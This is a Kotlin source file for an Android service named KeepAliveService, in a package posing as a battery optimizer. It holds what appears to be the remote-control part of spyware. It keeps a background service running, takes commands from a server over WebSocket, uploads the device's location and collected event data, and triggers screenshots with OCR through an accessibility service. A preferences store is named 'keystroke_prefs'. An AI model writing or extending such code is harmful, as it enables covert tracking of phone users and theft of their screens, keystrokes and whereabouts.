package com.android.batteryoptimization

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.android.batteryoptimization.network.WebSocketManager
import com.google.gson.JsonObject

/**
 * 保活服务 → 同时管理 WebSocket 长连接，接收服务器下发的指令。
 *
 * 支持的指令：
 *  - report_location    → 立即获取地理位置并上传
 *  - upload_data        → 立即上传收集到的事件数据
 *  - take_screenshot    → 触发截屏 + OCR
 *  - set_interval       → 修改自动截屏间隔
 */
class KeepAliveService : Service() {

    private var isWebSocketStarted = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "KeepAliveService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "KeepAliveService started")

        if (!isWebSocketStarted) {
            isWebSocketStarted = true
            setupWebSocket()
        }

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        WebSocketManager.stop()
        Log.d(TAG, "KeepAliveService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── WebSocket 初始化 ─────────────────────────────────────────────

    private fun setupWebSocket() {
        WebSocketManager.onCommand = { command, params ->
            handleCommand(command, params)
        }
        WebSocketManager.start(this)
    }

    // ─── 指令分发 ─────────────────────────────────────────────────────

    private fun handleCommand(command: String, params: JsonObject?) {
        Log.d(TAG, "Handling command: $command")
        when (command) {
            "report_location" -> handleReportLocation()
            "upload_data" -> handleUploadData()
            "take_screenshot" -> handleTakeScreenshot()
            "set_interval" -> handleSetInterval(params)
            else -> Log.w(TAG, "Unknown command: $command")
        }
    }

    /** 立即获取定位并通过 WebSocket 上报 */
    private fun handleReportLocation() {
        Thread {
            try {
                val location = AMapLocationHelper.getLocation(this)
                WebSocketManager.sendLocation(location)
                Log.d(TAG, "Location reported: lat=${location["latitude"]}, lng=${location["longitude"]}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to report location", e)
            }
        }.start()
    }

    /** 立即上报收集到的事件数据 */
    private fun handleUploadData() {
        Thread {
            try {
                val repo = InputRepository.getInstance(this)
                kotlinx.coroutines.runBlocking {
                    val (_, msg) = repo.uploadData()
                    Log.d(TAG, "Upload triggered by server: $msg")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload data", e)
            }
        }.start()
    }

    /** 触发截屏 + OCR */
    private fun handleTakeScreenshot() {
        val intent = Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
            setPackage(packageName)
        }
        sendBroadcast(intent)
        Log.d(TAG, "Screenshot broadcast sent")
    }

    /** 修改自动截屏间隔 */
    private fun handleSetInterval(params: JsonObject?) {
        val intervalMs = params?.get("interval_ms")?.asLong
        if (intervalMs != null && intervalMs > 0) {
            val prefs = getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
            prefs.edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
            Log.d(TAG, "Screenshot interval set to ${intervalMs}ms")
        }
    }

    companion object {
        private const val TAG = "KeepAlive"
    }
}
